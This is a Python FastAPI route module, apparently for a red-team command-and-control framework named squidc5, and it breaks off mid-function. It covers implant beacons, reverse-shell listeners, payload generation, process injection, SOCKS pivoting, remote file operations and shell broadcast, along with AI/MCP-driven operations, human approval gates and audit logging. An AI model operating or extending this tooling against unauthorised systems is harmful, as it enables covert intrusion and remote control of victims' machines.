"""REST API routes for operators, implants, and admin."""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import PlainTextResponse, Response, StreamingResponse
from pydantic import BaseModel, Field

from squidc5.api.deps import get_auth, get_state, require_scope
from squidc5.auth.tokens import ALL_MCP_TOOLS, DEFAULT_MCP_TOOLS, SCOPES, AuthContext
from squidc5.paths import web_file
from squidc5.policy.engine import PolicyDecision

# --- Request models ---


def _policy_http_error(decision: PolicyDecision) -> HTTPException:
    detail: dict[str, Any] = {"detail": decision.reason, "require_hitl": decision.require_hitl}
    if decision.hitl_request_id:
        detail["hitl_request_id"] = decision.hitl_request_id
    return HTTPException(status_code=403, detail=detail)


class TokenCreate(BaseModel):
    name: str
    scopes: list[str]
    mcp_tools: list[str] | None = None


class ListenerCreate(BaseModel):
    name: str
    kind: str = "http"  # http | tcp | reverse_shell | dns | smtp
    host: str = "0.0.0.0"
    port: int
    config: dict[str, Any] = Field(default_factory=dict)


class OastTokenCreate(BaseModel):
    note: str = ""
    label: str = ""  # alias for note
    meta: dict[str, Any] = Field(default_factory=dict)


# backward-compatible alias
OastClientCreate = OastTokenCreate


class TaskCreate(BaseModel):
    session_id: str
    command: str
    args: dict[str, Any] = Field(default_factory=dict)
    hitl_approved: bool = False  # ignored; use hitl_request_id
    hitl_request_id: str | None = None


class TaskUpdate(BaseModel):
    command: str | None = None
    args: dict[str, Any] | None = None


class PayloadRequest(BaseModel):
    template: str
    host: str
    port: int
    interval: int = 5
    profile_id: str | None = None
    # https / wss helpers (payload scheme only; TLS terminates at redirector or reverse proxy)
    scheme: str | None = None  # http|https|ws|wss
    zone: str | None = None  # DNS zone override


class LLMConfig(BaseModel):
    name: str
    provider: str = "openai"
    model: str
    base_url: str | None = None
    api_key: str | None = None
    capabilities: list[str] | None = None


class AIRunRequest(BaseModel):
    capability: str
    user_data: str = ""
    llm_id: str | None = None


class ShellCommand(BaseModel):
    session_id: str
    command: str
    hitl_approved: bool = False  # ignored; use hitl_request_id
    hitl_request_id: str | None = None
    wait_sec: float = 2.5
    idle_sec: float = 0.45


class FileOpRequest(BaseModel):
    session_id: str
    op: str  # list | read | write | delete
    path: str = ""
    content: str | None = None
    content_b64: str | None = None
    hitl_request_id: str | None = None


class SocksStart(BaseModel):
    session_id: str
    listen_host: str = "127.0.0.1"
    listen_port: int = 0
    mode: str = "implant"  # implant (reverse-dial) | direct (C2 dials target)


class InjectTaskRequest(BaseModel):
    session_id: str
    technique: str = "create_remote_thread"
    pid: int = 0
    args: dict[str, Any] = Field(default_factory=dict)


class BofRunRequest(BaseModel):
    session_id: str
    module_id: str
    entry: str = "go"
    object_b64: str | None = None


class BeaconIn(BaseModel):
    session_id: str | None = None
    hostname: str | None = None
    username: str | None = None
    os_info: str | None = None
    metadata: dict[str, Any] = Field(default_factory=dict)


class TaskResultIn(BaseModel):
    task_id: str
    result: str
    status: str = "completed"


class PolicyUpdate(BaseModel):
    rules: dict[str, Any]


class FeaturesUpdate(BaseModel):
    features: dict[str, bool]


class ProfileShapeRequest(BaseModel):
    profile_id: str | None = None
    beacon: dict[str, Any] = Field(default_factory=dict)


class ImplantPlanRequest(BaseModel):
    family: str = "http_beacon"
    platform: str = "linux"
    arch: str = "x64"
    host: str | None = None
    port: int | None = None


class TeamCreate(BaseModel):
    name: str


class HandoffRequest(BaseModel):
    to: str
    note: str = ""
    transfer_claim: bool = True
    include_pack: bool = True


class ClaimRequest(BaseModel):
    force: bool = False


class PresenceHeartbeat(BaseModel):
    status: str = "online"
    viewing_session: str | None = None


class PluginRegister(BaseModel):
    manifest: dict[str, Any]
    signature: str
    enable: bool = False


class PluginExecute(BaseModel):
    name: str
    capability: str
    args: dict[str, Any] = Field(default_factory=dict)


class AIChainRequest(BaseModel):
    playbook: str
    user_data: str = ""
    llm_id: str | None = None
    max_steps: int | None = None


class ProfileUpsert(BaseModel):
    id: str | None = None
    name: str
    channel: str = "http"
    description: str = ""
    http: dict[str, Any] | None = None
    dns: dict[str, Any] | None = None
    ws: dict[str, Any] | None = None
    active: bool = False


class ChatMessage(BaseModel):
    message: str
    team_id: str | None = None


class OwnerSet(BaseModel):
    owner: str


class ImplantGenerateRequest(BaseModel):
    family: str = "memory_beacon_python"
    platform: str = "linux"
    arch: str = "x64"
    host: str
    port: int
    path: str | None = None
    evasion: bool = True
    profile_id: str | None = None


class ImplantBuildRequest(BaseModel):
    os: str = "linux"
    arch: str = "amd64"
    host: str
    port: int = 8443
    path: str = "/api/v1/implant/beacon"
    scheme: str = "https"
    sleep: float = 5.0
    jitter: float = 20.0
    kill_date: int | None = None
    max_miss: int = 0
    work_start: int = 0
    work_end: int = 0
    channel: str = "http"  # http | ws
    sleep_mask: str = "jitter"


class EngagementUpdate(BaseModel):
    name: str | None = None
    cidrs: list[str] | None = None
    banned_commands: list[str] | None = None
    end_ts: float | None = None
    require_hitl_file_write: bool | None = None
    max_sessions: int | None = None
    notes: str | None = None


class RedirectorRequest(BaseModel):
    listen_port: int = 443
    upstream_host: str = "127.0.0.1"
    upstream_port: int = 8443
    server_name: str = "cdn.example.invalid"
    beacon_uris: list[str] | None = None


class CertPlanRequest(BaseModel):
    domains: list[str]
    days: int = 60


class TeamMemberAdd(BaseModel):
    actor: str
    role: str = "operator"


class PluginInstall(BaseModel):
    name: str
    enable: bool = True


def build_api_router() -> APIRouter:
    api = APIRouter(prefix="/api/v1")

    # ----- Health / meta -----

    @api.get("/health")
    async def health(request: Request) -> dict[str, Any]:
        state = get_state(request)
        # Secure default: minimal fingerprint
        if not state.settings.expose_health_details:
            return {"status": "ok"}
        return {
            "status": "ok",
            "app": state.settings.app_name,
            "version": "0.1.0",
        }

    @api.get("/health/deep")
    async def health_deep(
        request: Request,
        auth: AuthContext = Depends(require_scope("metrics:read", "admin")),
    ) -> dict[str, Any]:
        """Authenticated deep health — no secrets/tokens/keys."""
        from squidc5 import __version__

        state = get_state(request)
        db_ok = False
        try:
            await state.db.fetchone("SELECT 1 AS ok")
            db_ok = True
        except Exception:
            db_ok = False

        data_dir = state.settings.data_dir
        disk: dict[str, Any] = {"path": str(data_dir), "writable": False}
        try:
            data_dir.mkdir(parents=True, exist_ok=True)
            probe = data_dir / ".health_write_probe"
            probe.write_text("ok", encoding="utf-8")
            probe.unlink(missing_ok=True)
            disk["writable"] = True
        except OSError as e:
            disk["error"] = type(e).__name__

        listeners = await state.listeners.list()
        running = [x for x in listeners if x.get("status") == "running"]
        live_binds = sorted(
            set(state.listeners._servers.keys()) | set(state.listeners._udp.keys())
        )
        overall = "ok" if db_ok and disk.get("writable") else "degraded"
        return {
            "status": overall,
            "version": __version__,
            "db": {"ok": db_ok},
            "disk": disk,
            "listeners": {
                "configured": len(listeners),
                "running_status": len(running),
                "live_binds": len(live_binds),
            },
            "tls_enabled": bool(state.settings.tls_enabled),
            "mcp_enabled_setting": bool(state.settings.mcp_enabled),
        }

    @api.get("/meta")
    async def meta(auth: AuthContext = Depends(get_auth)) -> dict[str, Any]:
        return {
            "scopes": sorted(auth.scopes),
            "all_scopes": sorted(SCOPES),
            "default_mcp_tools": sorted(DEFAULT_MCP_TOOLS),
            "all_mcp_tools": sorted(ALL_MCP_TOOLS),
            "mcp_tools": sorted(auth.mcp_tools),
            "actor": auth.name,
            "actor_type": auth.actor_type,
            "token_id": auth.token_id,
        }

    # ----- Tokens -----

    @api.post("/tokens")
    async def create_token(
        body: TokenCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("tokens:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(auth, "tokens.create", extra={"name": body.name})
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            tid, raw = await state.tokens.create(
                name=body.name,
                scopes=body.scopes,
                mcp_tools=body.mcp_tools,
                created_by=auth.name,
                grantor_scopes=list(auth.scopes),
                grantor_is_admin=auth.has_scope("admin"),
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        return {"id": tid, "token": raw, "name": body.name, "scopes": body.scopes}

    @api.get("/tokens")
    async def list_tokens(
        request: Request,
        auth: AuthContext = Depends(require_scope("tokens:manage", "admin")),
    ) -> list[dict[str, Any]]:
        state = get_state(request)
        rows = await state.db.list_tokens()
        return [state.tokens.parse_row(r) for r in rows]

    @api.delete("/tokens/{token_id}")
    async def revoke_token(
        token_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("tokens:manage", "admin")),
    ) -> dict[str, bool]:
        state = get_state(request)
        ok = await state.tokens.revoke(token_id, auth.name)
        return {"revoked": ok}

    # ----- Sessions -----

    @api.get("/sessions")
    async def list_sessions(
        request: Request,
        status: str | None = None,
        live_only: bool = False,
        kind: str | None = None,
        auth: AuthContext = Depends(require_scope("sessions:read", "admin")),
    ) -> list[dict[str, Any]]:
        state = get_state(request)
        await state.policy.check_and_audit(auth, "sessions.list")
        # Reap reverse shells with no TCP channel; optionally probe execution
        probe = request.query_params.get("probe", "").lower() in ("1", "true", "yes")
        await state.sessions.close_orphaned_shells(probe=probe)
        rows = await state.sessions.list(status=status)
        if kind:
            kinds = {k.strip() for k in kind.split(",") if k.strip()}
            # aliases
            if kinds & {"shell", "rev", "reverse", "shells"}:
                kinds.update({"reverse_shell", "tcp"})
                kinds -= {"shell", "rev", "reverse", "shells"}
            rows = [r for r in rows if r.get("kind") in kinds]
        if live_only:
            # Default: only verified reverse shells (exec-proven) + active beacons
            filtered: list[dict[str, Any]] = []
            for r in rows:
                k = r.get("kind")
                if k in ("reverse_shell", "tcp"):
                    if r.get("interactive") and r.get("verified"):
                        filtered.append(r)
                elif k == "beacon":
                    if r.get("status") == "active":
                        filtered.append(r)
                else:
                    filtered.append(r)
            rows = filtered
        return rows

    @api.get("/sessions/{session_id}")
    async def get_session(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        await state.sessions.close_orphaned_shells()
        s = await state.sessions.get(session_id)
        if not s:
            raise HTTPException(404, "session not found")
        return s

    @api.post("/sessions/{session_id}/close")
    async def close_session(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:write", "admin")),
    ) -> dict[str, str]:
        state = get_state(request)
        await state.sessions.close(session_id)
        return {"status": "closed", "id": session_id}

    @api.post("/sessions/reap")
    async def reap_sessions(
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:write", "admin")),
    ) -> dict[str, int]:
        state = get_state(request)
        body: dict[str, Any] = {}
        try:
            body = await request.json()
        except Exception:
            body = {}
        probe = bool(body.get("probe", True))
        n = await state.sessions.close_orphaned_shells(probe=probe)
        return {"closed": n, "probed": probe}

    @api.post("/sessions/clear")
    async def clear_sessions(
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:write", "admin")),
    ) -> dict[str, Any]:
        """Bulk remove reverse-shell/tcp noise (scanners on public ports)."""
        state = get_state(request)
        body: dict[str, Any] = {}
        try:
            body = await request.json()
        except Exception:
            body = {}
        unverified_only = bool(body.get("unverified_only", True))
        closed_only = bool(body.get("closed_only", False))
        active_only = bool(body.get("active_only", False))
        delete = bool(body.get("delete", True))
        if body.get("all_shells"):
            unverified_only = False
            closed_only = False
            active_only = False
        decision = await state.policy.check_and_audit(
            auth,
            "sessions.clear",
            extra={
                "unverified_only": unverified_only,
                "closed_only": closed_only,
                "delete": delete,
            },
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        result = await state.sessions.clear_shells(
            unverified_only=unverified_only,
            closed_only=closed_only,
            active_only=active_only,
            delete=delete,
        )
        return result

    @api.delete("/sessions/{session_id}")
    async def delete_session(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:write", "admin")),
    ) -> dict[str, str]:
        state = get_state(request)
        ok = await state.sessions.delete(session_id)
        if not ok:
            raise HTTPException(404, "session not found")
        return {"status": "deleted", "id": session_id}

    # ----- Tasks -----

    @api.get("/tasks")
    async def list_tasks(
        request: Request,
        session_id: str | None = None,
        status: str | None = None,
        auth: AuthContext = Depends(require_scope("tasks:read", "admin")),
    ) -> list[dict[str, Any]]:
        """List tasks. Non-admins must pass session_id (no global enumeration)."""
        state = get_state(request)
        if not auth.has_scope("admin"):
            if not session_id:
                raise HTTPException(
                    400, "session_id required (non-admin cannot list all tasks)"
                )
            # read path: allow if not claim-locked against this actor
            try:
                await state.teams.assert_write_access(
                    session_id, auth.name, is_admin=False
                )
            except KeyError as e:
                raise HTTPException(404, str(e)) from e
            except PermissionError as e:
                raise HTTPException(403, str(e)) from e
        return await state.tasks.list(session_id=session_id, status=status)

    @api.post("/tasks")
    async def create_task(
        body: TaskCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(
            auth,
            "tasks.create",
            resource=body.session_id,
            extra={
                "hitl_request_id": body.hitl_request_id,
                "command": body.command,
            },
        )
        if not decision.allowed:
            raise _policy_http_error(decision)
        try:
            await state.teams.assert_write_access(
                body.session_id, auth.name, is_admin=auth.has_scope("admin")
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        try:
            return await state.tasks.create(
                session_id=body.session_id,
                command=body.command,
                args=body.args,
                created_by=auth.name,
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except ValueError as e:
            raise HTTPException(400, str(e)) from e

    @api.get("/tasks/{task_id}")
    async def get_task(
        task_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        t = await state.tasks.get(task_id)
        if not t:
            raise HTTPException(404, "task not found")
        return t

    @api.post("/tasks/{task_id}/cancel")
    async def cancel_task(
        task_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:write", "admin")),
    ) -> dict[str, Any]:
        """Cancel a pending task (not yet picked up by implant)."""
        state = get_state(request)
        try:
            t = await state.tasks.get(task_id)
            if not t:
                raise HTTPException(404, "task not found")
            if not auth.has_scope("admin"):
                await state.teams.assert_write_access(
                    t["session_id"], auth.name, is_admin=False
                )
            out = await state.tasks.cancel(task_id)
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="tasks.cancel",
            resource=task_id,
            risk_score=3,
        )
        return out

    @api.patch("/tasks/{task_id}")
    async def update_task(
        task_id: str,
        body: TaskUpdate,
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:write", "admin")),
    ) -> dict[str, Any]:
        """Modify command/args on a pending task only."""
        state = get_state(request)
        if body.command is None and body.args is None:
            raise HTTPException(400, "command or args required")
        try:
            t = await state.tasks.get(task_id)
            if not t:
                raise HTTPException(404, "task not found")
            if not auth.has_scope("admin"):
                await state.teams.assert_write_access(
                    t["session_id"], auth.name, is_admin=False
                )
            out = await state.tasks.update_pending(
                task_id, command=body.command, args=body.args
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="tasks.update",
            resource=task_id,
            risk_score=3,
        )
        return out

    # ----- Listeners -----

    @api.get("/listeners")
    async def list_listeners(
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:read", "admin")),
    ) -> list[dict[str, Any]]:
        return await get_state(request).listeners.list()

    @api.post("/listeners")
    async def create_listener(
        body: ListenerCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if body.kind == "http" and not await state.features.enabled("http_listeners"):
            raise HTTPException(403, "HTTP listeners disabled by feature flag")
        if body.kind == "dns" and not await state.features.enabled("dns_listeners"):
            raise HTTPException(403, "DNS listeners disabled by feature flag")
        if body.kind == "smtp" and not await state.features.enabled("smtp_oast"):
            raise HTTPException(403, "SMTP OAST disabled by feature flag")
        if body.kind in ("tcp", "reverse_shell") and not await state.features.enabled(
            "reverse_shell_listeners"
        ):
            raise HTTPException(403, "Reverse-shell/TCP listeners disabled by feature flag")
        decision = await state.policy.check_and_audit(
            auth, "listeners.create", extra={"port": body.port, "kind": body.kind}
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.listeners.create(
                name=body.name, kind=body.kind, port=body.port, host=body.host, config=body.config
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e

    @api.post("/listeners/{listener_id}/start")
    async def start_listener(
        listener_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(auth, "listeners.start", resource=listener_id)
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.listeners.start(listener_id)
        except KeyError:
            raise HTTPException(404, "listener not found") from None
        except OSError as e:
            raise HTTPException(400, f"bind failed: {e}") from e

    @api.post("/listeners/{listener_id}/stop")
    async def stop_listener(
        listener_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        try:
            return await state.listeners.stop(listener_id)
        except KeyError:
            raise HTTPException(404, "listener not found") from None

    @api.delete("/listeners/{listener_id}")
    async def delete_listener(
        listener_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, bool]:
        ok = await get_state(request).listeners.delete(listener_id)
        return {"deleted": ok}

    # ----- Payloads -----

    @api.get("/payloads/templates")
    async def payload_templates(
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, list[str]]:
        from squidc5.payloads.generator import PayloadGenerator

        return {"templates": PayloadGenerator().list_templates()}

    @api.post("/payloads/generate")
    async def generate_payload(
        body: PayloadRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("payloads_generate"):
            raise HTTPException(403, "Payload generation is disabled by feature flag")
        decision = await state.policy.check_and_audit(
            auth, "payloads.generate", extra={"template": body.template}
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            prof = None
            if body.profile_id:
                prof = state.profiles.get(body.profile_id)
                if not prof:
                    raise HTTPException(404, "profile not found")
            else:
                prof = state.profiles.active()
            plan: dict[str, Any] = {}
            session_path = "/api/v1/implant/beacon"
            interval = body.interval
            if prof:
                plan = state.profiles.implant_snippet(prof, body.host, body.port)
                ch = plan.get("channel") or prof.channel
                if ch == "http" and plan.get("uri"):
                    session_path = plan["uri"]
                elif ch == "ws":
                    from urllib.parse import urlparse

                    session_path = urlparse(plan.get("url") or "").path or "/ws/v1/beacon"
                    plan["ws_path"] = session_path
                elif ch == "dns":
                    plan["zone"] = plan.get("zone") or (prof.dns.zone if prof else "c2.lab.invalid")
                if plan.get("sleep_sec"):
                    interval = int(max(1, round(float(plan["sleep_sec"]))))
            if body.zone:
                plan["zone"] = body.zone
            if body.scheme:
                plan["scheme"] = body.scheme
            # auto-select template family from profile channel when using generic names
            template = body.template
            if prof and template == "http_beacon_python" and prof.channel == "dns":
                template = "dns_beacon_python"
            if prof and template == "http_beacon_python" and prof.channel == "ws":
                template = "ws_beacon_python"
            result = state.payloads.generate(
                template=template,
                host=body.host,
                port=body.port,
                session_path=session_path,
                interval=interval,
                extra=plan,
            )
        except HTTPException:
            raise
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.metrics.incr("payloads.generated")
        return result

    # ----- File ops (structured tasks) -----

    @api.post("/files/op")
    async def file_op(
        body: FileOpRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        """Queue structured file op task on a session (implant executes)."""
        state = get_state(request)
        op = (body.op or "").strip().lower()
        cmd = f"file:{op}"
        args: dict[str, Any] = {"path": body.path}
        if body.content is not None:
            args["content"] = body.content
        if body.content_b64 is not None:
            args["content_b64"] = body.content_b64
        try:
            await state.teams.assert_write_access(
                body.session_id, auth.name, is_admin=auth.has_scope("admin")
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        decision = await state.policy.check_and_audit(
            auth,
            "files.upload" if op == "write" else "files.download",
            resource=body.session_id,
            extra={"hitl_request_id": body.hitl_request_id, "command": cmd, "path": body.path},
        )
        if not decision.allowed:
            raise _policy_http_error(decision)
        if op == "write" and body.hitl_request_id:
            args["hitl_request_id"] = body.hitl_request_id
            args["hitl_approved_server"] = True
        if op == "write" and auth.has_scope("admin"):
            args["hitl_approved_server"] = True
        try:
            return await state.tasks.create(
                session_id=body.session_id,
                command=cmd,
                args=args,
                created_by=auth.name if not auth.has_scope("admin") else "admin",
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except ValueError as e:
            raise HTTPException(400, str(e)) from e

    # ----- SOCKS pivot -----

    @api.get("/pivot/socks")
    async def list_socks(
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        socks = get_state(request).socks
        return {"pivots": socks.list() if socks else []}

    @api.post("/pivot/socks")
    async def start_socks(
        body: SocksStart,
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not state.socks:
            raise HTTPException(503, "SOCKS broker unavailable")
        decision = await state.policy.check_and_audit(
            auth, "shell.interact", resource=body.session_id, extra={"command": "socks:start"}
        )
        if not decision.allowed:
            raise _policy_http_error(decision)
        try:
            await state.teams.assert_write_access(
                body.session_id, auth.name, is_admin=auth.has_scope("admin")
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        try:
            pivot = await state.socks.start(
                body.session_id,
                listen_host=body.listen_host,
                listen_port=body.listen_port,
                mode=body.mode or "implant",
                allow_direct=auth.has_scope("admin") and (body.mode or "") == "direct",
                allow_non_loopback=auth.has_scope("admin"),
            )
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        # Queue implant task for reverse-dial mode
        try:
            await state.tasks.create(
                session_id=body.session_id,
                command="socks:start",
                args=pivot.get("task_hint", {}).get("args")
                or {"pivot_id": pivot["id"], "port": pivot["listen_port"]},
                created_by=auth.name,
            )
        except Exception:
            pass
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="pivot.socks.start",
            resource=body.session_id,
            details={"pivot_id": pivot["id"], "port": pivot["listen_port"]},
            risk_score=7,
        )
        return pivot

    @api.delete("/pivot/socks/{pivot_id}")
    async def stop_socks(
        pivot_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, str]:
        state = get_state(request)
        ok = await state.socks.stop(pivot_id) if state.socks else False
        if not ok:
            raise HTTPException(404, "pivot not found")
        return {"status": "stopped", "id": pivot_id}

    # ----- Modules: inject / BOF / sleep mask catalog -----

    @api.get("/modules")
    async def list_modules_catalog(
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:read", "shell:interact", "admin")),
    ) -> dict[str, Any]:
        from squidc5.modules.catalog import (
            list_bof_modules,
            list_inject_techniques,
            sleep_mask_catalog,
        )

        return {
            "inject": list_inject_techniques(),
            "bof": list_bof_modules(),
            "sleep_mask": sleep_mask_catalog(),
            "gates": {
                "inject": "SC5_ALLOW_INJECT=1 on implant",
                "bof": "SC5_ALLOW_BOF=1 on implant",
            },
        }

    @api.get("/modules/bof")
    async def list_bof(
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:read", "admin")),
    ) -> dict[str, Any]:
        from squidc5.modules.catalog import list_bof_modules

        return {"modules": list_bof_modules()}

    @api.get("/modules/inject")
    async def list_inject(
        request: Request,
        platform: str | None = None,
        auth: AuthContext = Depends(require_scope("tasks:read", "admin")),
    ) -> dict[str, Any]:
        from squidc5.modules.catalog import list_inject_techniques

        return {"techniques": list_inject_techniques(platform)}

    @api.post("/modules/inject")
    async def queue_inject(
        body: InjectTaskRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        """Queue lab inject task (implant refuses without SC5_ALLOW_INJECT=1)."""
        state = get_state(request)
        tech = (body.technique or "").strip().lower()
        if not tech:
            raise HTTPException(400, "technique required")
        cmd = f"inject:{tech}" if not tech.startswith("inject:") else tech
        args: dict[str, Any] = {"technique": tech.replace("inject:", ""), "pid": body.pid}
        args.update(body.args or {})
        decision = await state.policy.check_and_audit(
            auth,
            "shell.interact",
            resource=body.session_id,
            extra={"command": cmd, "technique": tech},
        )
        if not decision.allowed:
            raise _policy_http_error(decision)
        try:
            await state.teams.assert_write_access(
                body.session_id, auth.name, is_admin=auth.has_scope("admin")
            )
            task = await state.tasks.create(
                session_id=body.session_id,
                command=cmd,
                args=args,
                created_by=auth.name,
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="modules.inject.queue",
            resource=body.session_id,
            details={"technique": tech, "task_id": task.get("id")},
            risk_score=9,
        )
        return task

    @api.post("/modules/bof/run")
    async def queue_bof_run(
        body: BofRunRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        """Queue BOF run plan (implant refuses without SC5_ALLOW_BOF=1)."""
        from squidc5.modules.catalog import bof_modules_dir
        from squidc5.modules.coff_loader import plan_bof_run

        state = get_state(request)
        mod_id = (body.module_id or "").strip()
        if not mod_id or "/" in mod_id or "\\" in mod_id or ".." in mod_id:
            raise HTTPException(400, "invalid module_id")
        obj_path = bof_modules_dir() / f"{mod_id}.c"
        # Prefer .o if present (compiled COFF)
        o_path = bof_modules_dir() / f"{mod_id}.o"
        path = o_path if o_path.is_file() else (obj_path if obj_path.is_file() else None)
        plan = plan_bof_run(
            module_id=mod_id,
            object_path=path,
            object_b64=body.object_b64,
            entry=body.entry or "go",
        )
        decision = await state.policy.check_and_audit(
            auth,
            "shell.interact",
            resource=body.session_id,
            extra={"command": "bof:run", "module_id": mod_id},
        )
        if not decision.allowed:
            raise _policy_http_error(decision)
        try:
            await state.teams.assert_write_access(
                body.session_id, auth.name, is_admin=auth.has_scope("admin")
            )
            task = await state.tasks.create(
                session_id=body.session_id,
                command=plan["command"],
                args=plan["args"],
                created_by=auth.name,
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="modules.bof.run",
            resource=body.session_id,
            details={"module_id": mod_id, "task_id": task.get("id")},
            risk_score=9,
        )
        return task

    # ----- Shell interact -----

    @api.post("/shell/command")
    async def shell_command(
        body: ShellCommand,
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(
            auth,
            "shell.interact",
            resource=body.session_id,
            extra={
                "hitl_request_id": body.hitl_request_id,
                "command": body.command,
            },
        )
        if not decision.allowed:
            raise _policy_http_error(decision)
        # M1 claim lock + team RBAC
        try:
            await state.teams.assert_write_access(
                body.session_id, auth.name, is_admin=auth.has_scope("admin")
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        if not state.listeners.is_live(body.session_id):
            # Stale DB row looking "active" but TCP is gone
            await state.sessions.close(body.session_id)
            raise HTTPException(
                404,
                "No live TCP channel for this session (connection already dead). "
                "Wait for the implant to reconnect or send a new reverse shell.",
            )
        result = await state.listeners.run_shell(
            body.session_id,
            body.command,
            wait_sec=max(0.0, min(body.wait_sec, 30.0)),
            idle_sec=max(0.1, min(body.idle_sec, 5.0)),
        )
        if not result.get("sent"):
            await state.sessions.close(body.session_id)
            raise HTTPException(404, result.get("error") or "No live reverse shell for session")
        return result

    @api.post("/shell/broadcast")
    async def shell_broadcast(
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        """Send one command to every live reverse shell."""
        state = get_state(request)
        if not await state.features.enabled("shell_broadcast"):
            raise HTTPException(403, "Shell broadcast is disabled by feature flag")
        body = await request.json()
        command = str(body.get("command") or "").strip()
        if not command:
            raise HTTPException(400, "command required")
        wait_sec = float(body.get("wait_sec", 2.5))
        idle_sec = float(body.get("idle_sec", 0.45))
        hitl_rid = body.get("hitl_request_id")
        decision = await state.policy.check_and_audit(
            auth,
            "shell.interact",
            resource="broadcast",
            extra={"hitl_request_id": hitl_rid, "command": command},
        )
        if not decision.allowed:
            raise _policy_http_error(decision)

        # Drop TCP-dead + non-executing zombies before broadcast
        await state.sessions.close_orphaned_shells(probe=True)
        rows = await state.sessions.list(status="active")
        # H03: skip sessions claimed by others (unless admin)
        if not auth.has_scope("admin"):
            filtered = []
            for r in rows:
                meta = r.get("metadata") if isinstance(r.get("metadata"), dict) else {}
                claimed = meta.get("claimed_by")
                if claimed and claimed != auth.name:
                    continue
                filtered.append(r)
            rows = filtered
        targets = [
            r
            for r in rows
            if r.get("kind") in ("reverse_shell", "tcp")
            and state.listeners.is_live(r["id"])
            and state.listeners.is_verified(r["id"])
        ]
